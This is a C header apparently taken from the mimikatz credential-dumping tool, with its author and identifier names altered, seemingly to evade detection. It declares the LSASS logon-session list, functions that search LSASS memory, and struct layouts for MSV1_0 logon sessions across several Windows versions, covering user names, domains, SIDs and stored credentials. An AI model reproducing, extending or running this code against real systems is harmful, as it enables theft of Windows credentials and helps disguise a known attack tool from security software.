/*	paparas DELPY `gamidiaaktinidio`
	http://blog.gamidiaaktinidio.com
	paparas@gamidiaaktinidio.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#pragma once
#include "globals_sekurlsa.h"
#include "kuhl_m_sekurlsa.h"
#include "../modules/kull_m_memory.h"

PLIST_ENTRY LogonSessionList;
PULONG LogonSessionListCount;

PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind);
PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuid(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind);
PVOID kuhl_m_sekurlsa_utils_pFromAVLByLuidRec(PKULL_M_MEMORY_ADDRESS pTable, ULONG LUIDoffset, PLUID luidToFind);

BOOL kuhl_m_sekurlsa_utils_search(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib);
BOOL kuhl_m_sekurlsa_utils_search_generic(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB pLib, PKULL_M_PATCH_GENERIC generics, SIZE_T cbGenerics, PVOID * genericPtr, PVOID * genericPtr1, PVOID * genericPtr2, PLONG genericOffset1);

typedef struct _aktinidio_MSV1_0_PRIMARY_CREDENTIALS {
	struct _aktinidio_MSV1_0_PRIMARY_CREDENTIALS *next;
	ANSI_STRING Primary;
	LSA_UNICODE_STRING Credentials;
} aktinidio_MSV1_0_PRIMARY_CREDENTIALS, *Paktinidio_MSV1_0_PRIMARY_CREDENTIALS;

typedef struct _aktinidio_MSV1_0_CREDENTIALS {
	struct _aktinidio_MSV1_0_CREDENTIALS *next;
	DWORD AuthenticationPackageId;
	Paktinidio_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} aktinidio_MSV1_0_CREDENTIALS, *Paktinidio_MSV1_0_CREDENTIALS;

typedef struct _aktinidio_MSV1_0_LIST_51 {
	struct _aktinidio_MSV1_0_LIST_51 *Flink;
	struct _aktinidio_MSV1_0_LIST_51 *Blink;
	LUID LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk0;
	PVOID unk1;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	PVOID unk22;
	ULONG unk23;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_51, *Paktinidio_MSV1_0_LIST_51;

typedef struct _aktinidio_MSV1_0_LIST_52 {
	struct _aktinidio_MSV1_0_LIST_52 *Flink;
	struct _aktinidio_MSV1_0_LIST_52 *Blink;
	LUID LocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk0;
	PVOID unk1;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_52, *Paktinidio_MSV1_0_LIST_52;

typedef struct _aktinidio_MSV1_0_LIST_60 {
	struct _aktinidio_MSV1_0_LIST_6 *Flink;
	struct _aktinidio_MSV1_0_LIST_6 *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	ULONG unk19;
	PVOID unk20;
	PVOID unk21;
	PVOID unk22;
	ULONG unk23;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_60, *Paktinidio_MSV1_0_LIST_60;

typedef struct _aktinidio_MSV1_0_LIST_61 {
	struct _aktinidio_MSV1_0_LIST_6 *Flink;
	struct _aktinidio_MSV1_0_LIST_6 *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_61, *Paktinidio_MSV1_0_LIST_61;

typedef struct _aktinidio_MSV1_0_LIST_61_ANTI_programa {
	struct _aktinidio_MSV1_0_LIST_61_ANTI_programa *Flink;
	struct _aktinidio_MSV1_0_LIST_61_ANTI_programa *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align) <===================
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	PSID  pSid;
	ULONG LogonType;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_61_ANTI_programa, *Paktinidio_MSV1_0_LIST_61_ANTI_programa;

typedef struct _aktinidio_MSV1_0_LIST_62 {
	struct _aktinidio_MSV1_0_LIST_62 *Flink;
	struct _aktinidio_MSV1_0_LIST_62 *Blink;
	PVOID unk0;
	ULONG unk1;
	PVOID unk2;
	ULONG unk3;
	ULONG unk4;
	ULONG unk5;
	HANDLE hSemaphore6;
	PVOID unk7;
	HANDLE hSemaphore8;
	PVOID unk9;
	PVOID unk10;
	ULONG unk11;
	ULONG unk12;
	PVOID unk13;
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_62, *Paktinidio_MSV1_0_LIST_62;

typedef struct _aktinidio_MSV1_0_LIST_63 {
	struct _aktinidio_MSV1_0_LIST_63 *Flink;	//off_2C5718
	struct _aktinidio_MSV1_0_LIST_63 *Blink; //off_277380
	PVOID unk0; // unk_2C0AC8
	ULONG unk1; // 0FFFFFFFFh
	PVOID unk2; // 0
	ULONG unk3; // 0
	ULONG unk4; // 0
	ULONG unk5; // 0A0007D0h
	HANDLE hSemaphore6; // 0F9Ch
	PVOID unk7; // 0
	HANDLE hSemaphore8; // 0FB8h
	PVOID unk9; // 0
	PVOID unk10; // 0
	ULONG unk11; // 0
	ULONG unk12; // 0 
	PVOID unk13; // unk_2C0A28
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align)
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	Paktinidio_MSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} aktinidio_MSV1_0_LIST_63, *Paktinidio_MSV1_0_LIST_63;